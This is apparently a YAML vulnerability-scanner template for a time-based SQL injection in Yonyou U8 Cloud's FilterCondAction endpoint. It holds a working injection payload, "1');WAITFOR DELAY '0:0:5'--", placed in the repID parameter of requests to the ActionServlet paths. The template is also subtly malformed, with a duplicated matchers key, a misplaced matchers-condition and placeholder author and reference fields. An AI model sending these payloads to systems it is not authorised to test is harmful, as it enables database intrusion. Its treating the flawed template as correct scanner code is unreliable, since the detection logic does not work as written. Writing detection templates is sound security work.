content:
id: yonyou-u8cloud-filtercondaction-sql-injection

info:
  name: Yonyou U8 Cloud FilterCondAction SQL Injection
  author: your_name
  severity: high
  description: |
    用友U8 Cloud系统的FilterCondAction方法存在SQL注入漏洞，攻击者可通过构造恶意请求窃取数据或控制数据库服务器。
  reference:
    - https://example.com/vuln-details # 请替换为实际参考链接
  tags: sql-injection,yonyou,u8cloud,china

requests:
  - method: GET
    path:
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet"
      - "{{BaseURL}}/com.ufida.web.action.ActionServlet"

    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "zh-CN,zh;q=0.9"
      Connection: "close"

    queries:
      action: "nc.ui.bi.report.rep.FilterCondAction"
      method: "execute"
      repID: "1');WAITFOR DELAY '0:0:5'--"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"  # 时间延迟检测，等待5秒
          - "status_code==200"  # 确保响应正常
        condition: and

    # 备选方案：基于响应内容的检测
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "超时"
          - "timeout"
          - "延迟"
          - "执行错误"
        part: body
        condition: or

  # 备选请求：使用不同的时间延迟进行验证
  - method: GET
    path:
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet"

    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "zh-CN,zh;q=0.9"
      Connection: "close"

    queries:
      action: "nc.ui.bi.report.rep.FilterCondAction"
      method: "execute"
      repID: "1');WAITFOR DELAY '0:0:3'--"

    matchers:
      - type: dsl
        dsl:
          - "duration>=3"
          - "duration<10"
        condition: and
